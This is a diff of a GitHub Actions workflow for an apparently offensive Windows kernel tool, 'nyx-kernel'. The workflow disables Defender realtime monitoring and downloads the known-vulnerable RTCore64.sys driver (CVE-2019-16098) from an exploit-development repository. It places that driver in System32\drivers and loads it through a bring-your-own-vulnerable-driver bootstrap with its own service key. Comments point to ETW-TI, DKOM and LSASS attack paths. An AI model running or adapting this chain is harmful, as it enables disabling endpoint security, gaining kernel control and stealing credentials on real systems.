@@ -107,18 +107,28 @@ jobs:
           $now = (Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring
           Write-Host "Defender realtime disabled (after step): $now"
 
-      # ---- 2. 准备 RTCore64.sys(运行时下载,不进 git)----
-      - name: Fetch RTCore64.sys (public PoC driver)
+      # ---- 2. 准备 RTCore64.sys(运行时下载,放进 System32\drivers 走相对路径)----
+      - name: Fetch RTCore64.sys (public PoC driver) + copy to System32\drivers
         if: steps.probe.outputs.skip == 'false'
         shell: pwsh
         run: |
           # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098).
           # Public PoC driver, fetched from a public BYOVD collection. Not committed
-          # to git (in target/, gitignored), not uploaded as artifact.
-          $driverDir = New-Item -ItemType Directory -Force -Path "target\drivers"
-          $driverPath = Join-Path $driverDir.FullName "RTCore64.sys"
+          # to git, not uploaded as artifact.
+          #
+          # IMPORTANT: we copy the driver into C:\Windows\System32\drivers\ so
+          # that build_image_path (driver_load.rs) emits a RELATIVE ImagePath
+          # ("System32\drivers\RTCore64.sys") resolved against %SystemRoot%.
+          # The absolute "\??\<drive>:\<path>" form is rejected on some builds
+          # (documented in driver_load.rs lines 175-177: Server 2019 returns
+          # STATUS_INVALID_IMAGE_FORMAT; Server 2025 returns
+          # STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034 - both are path-resolution
+          # failures of the absolute form). The relative form is what `sc create`
+          # writes and is universally accepted by NtLoadDriver.
+          $staging = New-Item -ItemType Directory -Force -Path "target\drivers"
+          $stagingPath = Join-Path $staging.FullName "RTCore64.sys"
+          $finalPath = "C:\Windows\System32\drivers\RTCore64.sys"
 
-          # Try multiple public mirrors (any one working is enough).
           # Verified 2026-07-06: VoidSec raw URL returns 200 with valid MZ PE.
           $mirrors = @(
             "https://raw.githubusercontent.com/VoidSec/Exploit-Development/b82b6d3ac1cce66221101d3e0f4634aa64cb4ca7/windows/x64/kernel/RTCore64_MSI_Afterburner_v.4.6.4.16117/RTCore64.sys",
@@ -128,16 +138,15 @@ jobs:
           foreach ($url in $mirrors) {
             try {
               Write-Host "trying: $url"
-              Invoke-WebRequest -Uri $url -OutFile $driverPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
-              $sz = (Get-Item $driverPath).Length
+              Invoke-WebRequest -Uri $url -OutFile $stagingPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+              $sz = (Get-Item $stagingPath).Length
               if ($sz -gt 10000) {
-                # Verify MZ PE magic before accepting.
-                $fs = [IO.File]::OpenRead($driverPath)
+                $fs = [IO.File]::OpenRead($stagingPath)
                 $b = New-Object byte[] 2
                 $fs.Read($b, 0, 2) | Out-Null
                 $fs.Close()
                 if ($b[0] -eq 0x4D -and $b[1] -eq 0x5A) {
-                  Write-Host "::notice::downloaded: $driverPath ($sz bytes, valid MZ)"
+                  Write-Host "::notice::downloaded: $stagingPath ($sz bytes, valid MZ)"
                   $got = $true
                   break
                 } else {
@@ -152,7 +161,11 @@ jobs:
             Write-Host "::error::all mirrors failed - manually place RTCore64.sys in target/drivers/ and retry"
             exit 1
           }
-          echo "DRIVER_PATH=$driverPath" >> $env:GITHUB_ENV
+
+          # Copy to System32\drivers so build_image_path uses the relative form.
+          Copy-Item -Path $stagingPath -Destination $finalPath -Force
+          Write-Host "::notice::copied to $finalPath (build_image_path emits relative 'System32\drivers\RTCore64.sys')"
+          echo "DRIVER_PATH=$finalPath" >> $env:GITHUB_ENV
 
       # ---- 3. 构建 operator-kernel-cli(P0.a/b + 3.b + ETW-TI/DKOM/LSASS 路径)----
       - name: Install Rust + build operator-kernel-cli
@@ -178,8 +191,14 @@ jobs:
         run: |
           REM ---- Task G: BYOVD driver load ----
           echo === Task G: BYOVD bootstrap ===
+          echo DRIVER_PATH=%DRIVER_PATH%
+          dir "%DRIVER_PATH%" 2>nul || echo DRIVER FILE MISSING
           crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --byovd "%DRIVER_PATH%" NyaRTCore
           echo BOOTSTRAP_EXIT=%ERRORLEVEL%
+
+          REM ---- Dump the registry key we wrote (debug)----
+          echo === Registry service key dump ===
+          reg query "HKLM\SYSTEM\CurrentControlSet\Services\NyaRTCore" 2>nul || echo NO KEY (RegCreateKeyExW must have failed)
           if %ERRORLEVEL% NEQ 0 (
             echo ::warning::bootstrap failed - see NTSTATUS above. Common causes:
             echo   0xC0000061 STATUS_PRIVILEGE_NOT_HELD  - SeLoadDriverPrivilege not enabled (fixed via RtlAdjustPrivilege)
